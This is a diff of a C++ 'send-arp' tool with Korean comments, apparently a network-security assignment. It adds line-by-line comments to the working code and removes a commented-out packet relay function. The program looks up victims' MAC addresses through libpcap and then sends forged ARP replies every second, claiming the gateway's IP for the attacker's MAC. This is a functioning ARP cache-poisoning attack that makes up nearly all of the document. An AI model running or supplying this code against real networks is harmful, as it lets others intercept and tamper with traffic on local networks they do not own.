@@ -20,12 +20,6 @@ struct ArpPair {
     uint8_t sender_mac[Mac::SIZE];
 };
 
-// 프로그램 사용법 출력 함수
-void usage() { 
-    printf("syntax: send-arp <interface> <sender ip1> <target ip1> [<sender ip2> <target ip2> ...]\n");
-    printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1 192.168.0.3 192.168.0.1\n");
-}
-
 // 공격자의 MAC 주소를 가져오는 함수
 void getAttackerMac(char* dev) { 
     int sock_d = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성
@@ -69,122 +63,93 @@ void sendArpRequest(char* dev, pcap_t* handle, uint32_t sender_ip) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 }
-//ARP 감염 패킷 전송
+// ARP 감염 패킷 전송 함수
 void sendArpInfectingReply(char* dev, pcap_t* handle, uint32_t victim_ip, 
                           const uint8_t* victim_mac, uint32_t gateway_ip) {
-    EthArpPacket packet;
+    EthArpPacket packet; // Ethernet + ARP 패킷 구조체 생성
     
-    packet.eth_.dmac_ = Mac(victim_mac);
-    packet.eth_.smac_ = Mac(attacker_mac);
-    packet.eth_.type_ = htons(EthHdr::Arp);
+    packet.eth_.dmac_ = Mac(victim_mac); // 수신자 MAC 주소 설정
+    packet.eth_.smac_ = Mac(attacker_mac); // 송신자 MAC 주소 설정
+    packet.eth_.type_ = htons(EthHdr::Arp); // Ethernet 타입: ARP 설정
 
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-    packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = Mac::SIZE;
-    packet.arp_.pln_ = Ip::SIZE;
-    packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.smac_ = Mac(attacker_mac);
-    packet.arp_.sip_ = Ip(gateway_ip);
-    packet.arp_.tmac_ = Mac(victim_mac);
-    packet.arp_.tip_ = Ip(victim_ip);
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER); // 하드웨어 타입: Ethernet 설정
+    packet.arp_.pro_ = htons(EthHdr::Ip4); // 프로토콜 타입: IPv4 설정
+    packet.arp_.hln_ = Mac::SIZE; // 하드웨어 주소 길이 설정
+    packet.arp_.pln_ = Ip::SIZE; // 프로토콜 주소 길이 설정
+    packet.arp_.op_ = htons(ArpHdr::Reply); // ARP 응답 설정
+    packet.arp_.smac_ = Mac(attacker_mac); // 응답자 MAC 주소 설정
+    packet.arp_.sip_ = Ip(gateway_ip); // 응답자 IP 주소 설정 (게이트웨이 IP)
+    packet.arp_.tmac_ = Mac(victim_mac); // 타겟 MAC 주소 설정
+    packet.arp_.tip_ = Ip(victim_ip); // 타겟 IP 주소 설정
 
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res != 0) {
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)); // 패킷 전송
+    if (res != 0) { // 전송 실패 시 에러 메시지 출력
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 }
 
-
-/*
-void relayPacket(pcap_t* handle, const u_char* received_packet, size_t packet_len,
-                uint8_t* victim_mac, uint8_t* gateway_mac) {
-    // 최소 패킷 크기 체크 (Ethernet 헤더 크기)
-    if (packet_len < sizeof(EthHdr)) {
-        fprintf(stderr, "Packet too small\n");
-        return;
-    }
-    
-    std::vector<u_char> relay_packet(received_packet, received_packet + packet_len);
-    struct EthHdr* eth_header = (struct EthHdr*)relay_packet.data();
-    
-    // MAC 클래스 사용하여 안전하게 MAC 주소 설정
-    if (memcmp(eth_header->dmac_, attacker_mac, Mac::SIZE) == 0) {
-        // victim -> attacker -> gateway
-        eth_header->dmac_ = Mac(gateway_mac);    // Mac 클래스의 할당 연산자 사용
-        eth_header->smac_ = Mac(attacker_mac);
-    } else {
-        // gateway -> attacker -> victim
-        eth_header->dmac_ = Mac(victim_mac);
-        eth_header->smac_ = Mac(attacker_mac);
-    }
-    
-    int result = pcap_sendpacket(handle, relay_packet.data(), packet_len);
-    if (result != 0) {
-        fprintf(stderr, "Failed to relay packet: %s\n", pcap_geterr(handle));
-    }
-}
-*/
-
 int main(int argc, char* argv[]) {
+    // 인자 수 확인: 최소 4개 이상, 짝수 개의 IP 쌍 필요
     if (argc < 4 || (argc - 2) % 2 != 0) {
-        usage();
-        return -1;
+        printf("syntax: send-arp <interface> <sender ip1> <target ip1> [<sender ip2> <target ip2> ...]\n");
+        printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1 192.168.0.3 192.168.0.1\n");
+        return -1; // 오류 발생 시 종료
     }
 
-    char* dev = argv[1];
-    getAttackerMac(dev);
-    getAttackerIP(dev);
+    char* dev = argv[1]; // 네트워크 장치 이름
+    getAttackerMac(dev); // 공격자의 MAC 주소 가져오기
+    getAttackerIP(dev); // 공격자의 IP 주소 가져오기
 
-    int pair_count = (argc - 2) / 2;
-    std::vector<ArpPair> arp_pairs;
-    char errbuf[PCAP_ERRBUF_SIZE];
+    int pair_count = (argc - 2) / 2; // ARP 페어의 수 계산
+    std::vector<ArpPair> arp_pairs; // ARP 페어를 저장할 벡터
+    char errbuf[PCAP_ERRBUF_SIZE]; // 오류 메시지를 저장할 버퍼
 
+    // 패킷 캡처를 위한 핸들 열기
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-    if (handle == nullptr) {
+    if (handle == nullptr) { // 핸들이 유효하지 않으면 오류 출력
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-        return -1;
+        return -1; // 오류 발생 시 종료
     }
 
     // 모든 ARP 페어에 대한 MAC 주소 수집
     for(int i = 0; i < pair_count; i++) {
-        ArpPair arp_pair;
-        arp_pair.sender_ip = inet_addr(argv[2 + i * 2]);
-        arp_pair.target_ip = inet_addr(argv[3 + i * 2]);
+        ArpPair arp_pair; // ARP 페어 구조체 생성
+        arp_pair.sender_ip = inet_addr(argv[2 + i * 2]); // 송신자 IP 주소 설정
+        arp_pair.target_ip = inet_addr(argv[3 + i * 2]); // 타겟 IP 주소 설정
 
-        sendArpRequest(dev, handle, arp_pair.sender_ip);
+        sendArpRequest(dev, handle, arp_pair.sender_ip); // ARP 요청 전송
 
-        while(true) {
-            struct pcap_pkthdr* header;
-            const u_char* packet;
-            int res = pcap_next_ex(handle, &header, &packet);
-            if (res == 0) continue;
-            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-                break;
+        while(true) { // 응답 패킷 수신 대기
+            struct pcap_pkthdr* header; // 패킷 헤더
+            const u_char* packet; // 수신된 패킷
+            int res = pcap_next_ex(handle, &header, &packet); // 패킷 수신
+            if (res == 0) continue; // 패킷이 없으면 계속 대기
+            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) { // 오류 발생 시
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle)); // 오류 메시지 출력
+                break; // 루프 종료
             }
 
-            EthArpPacket* recv_reply_packet = (struct EthArpPacket*)packet;
-            if (recv_reply_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
-            if (recv_reply_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
-            if (recv_reply_packet->arp_.sip_ != Ip(arp_pair.sender_ip)) continue;
+            EthArpPacket* recv_reply_packet = (struct EthArpPacket*)packet; // 수신된 패킷을 ARP 패킷으로 변환
+            if (recv_reply_packet->eth_.type_ != htons(EthHdr::Arp)) continue; // ARP 패킷이 아니면 무시
+            if (recv_reply_packet->arp_.op_ != htons(ArpHdr::Reply)) continue; // 응답 패킷이 아니면 무시
+            if (recv_reply_packet->arp_.sip_ != Ip(arp_pair.sender_ip)) continue; // 송신자 IP가 일치하지 않으면 무시
 
-            const uint8_t* mac_bytes = reinterpret_cast<const uint8_t*>(&recv_reply_packet->eth_.smac_);
-            memcpy(arp_pair.sender_mac, mac_bytes, Mac::SIZE);
-            arp_pairs.push_back(arp_pair);
-            break;
+            const uint8_t* mac_bytes = reinterpret_cast<const uint8_t*>(&recv_reply_packet->eth_.smac_); // 송신자 MAC 주소 추출
+            memcpy(arp_pair.sender_mac, mac_bytes, Mac::SIZE); // MAC 주소 복사
+            arp_pairs.push_back(arp_pair); // ARP 페어를 벡터에 추가
+            break; // 응답을 받았으므로 루프 종료
         }
     }
 
     // 모든 페어에 대해 주기적으로 ARP 감염 패킷 전송
     while(true) {
-        for(const auto& arp_pair : arp_pairs) {
-            sendArpInfectingReply(dev, handle, arp_pair.sender_ip, 
+        for(const auto& arp_pair : arp_pairs) { // 각 ARP 페어에 대해
+            sendArpInfectingReply(dev, handle, arp_pair.sender_ip, // ARP 감염 응답 전송
                                 arp_pair.sender_mac, arp_pair.target_ip);
         }
-        sleep(1);
+        sleep(1); // 1초 대기
     }
 
-    pcap_close(handle);
-    return 0;
+    pcap_close(handle); // 핸들 닫기
+    return 0; // 프로그램 종료
 }
-
